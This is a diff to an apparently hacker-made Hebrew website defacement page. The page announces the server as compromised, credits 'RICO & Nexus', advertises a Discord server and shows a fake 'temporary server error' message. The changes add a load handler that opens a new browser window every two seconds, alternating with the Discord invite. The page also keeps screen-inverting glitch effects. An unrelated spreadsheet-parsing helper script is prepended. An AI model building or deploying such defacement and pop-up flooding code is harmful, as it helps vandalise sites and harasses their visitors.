@@ -1,4 +1,43 @@
-<!DOCTYPE html>
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -42,7 +81,7 @@
                 background-image: url('https://iili.io/FlKvTQe.jpg');
             }
             50.1%, 100% { 
-                background-image: url('https://iili.io/FlfzNAF.jpg');
+                background-image: url('https://iili.io/FV3ZVPS.jpg');
             }
         }
 
@@ -324,7 +363,7 @@
     <div class="system-info">
         System Status: COMPROMISED<br>
         Security Level: [BREACHED]<br>
-        Time: <span id="current-time"></span>
+        Time: 08:29 PM IDT, Sunday, July 13, 2025
     </div>
     
     <div class="access-denied">
@@ -333,7 +372,7 @@
     </div>
     
     <div class="small-side-image">
-        <img src="https://imgur.com/qEpUaLK.gif" alt="Side Image" onerror="console.log('Image failed to load'); this.style.display='none';">
+        <img src="https://s14.gifyu.com/images/bKmid.gif" alt="Side Image" onerror="console.log('Image failed to load'); this.style.display='none';">
     </div>
     
     <div class="container">
@@ -345,7 +384,7 @@
         <div class="discord-link-text">DISCORD.GG/RICOMODZ</div>
         
         <a href="https://discord.gg/ricomodz" class="discord-url" target="_blank">
-            Hacked By RICO & NEXUS
+            Hacked By RICO & Nexus
         </a>
         
         <div class="warning-text">אופס! נראה שיש תקלה זמנית בשרת זה אנא נסה שוב מאוחר יותר<span class="terminal-cursor">_</span></div>
@@ -408,21 +447,27 @@
 
         setInterval(draw, 30);
 
-        // Update time
-        function updateTime() {
-            const now = new Date();
-            document.getElementById('current-time').textContent = now.toLocaleTimeString();
-        }
-        setInterval(updateTime, 1000);
-        updateTime();
-
         // Resize canvas on window resize
         window.addEventListener('resize', () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
         });
 
-        // Intensified glitch effects from second code
+        // Continuously open windows with alternating URLs
+        window.addEventListener('load', () => {
+            let count = 0;
+            const urls = [
+                'https://www.google.com/search?q=https://test.com',
+                'https://discord.gg/ricomodz'
+            ];
+            setInterval(() => {
+                const url = urls[count % 2]; // Alternate between the two URLs
+                window.open(url, '_blank');
+                count++;
+            }, 2000); // Open a new window every 2 seconds
+        });
+
+        // Intensified glitch effects
         setInterval(() => {
             if (Math.random() > 0.7) {
                 document.body.style.filter = 'invert(1) contrast(300%) hue-rotate(90deg)';
@@ -432,7 +477,7 @@
             }
         }, 500);
 
-        // Flying text messages from second code, adapted to first code's theme
+        // Flying text messages
         const messages = [
             'שרת זה נפרץ',
             'ריקו שולט',
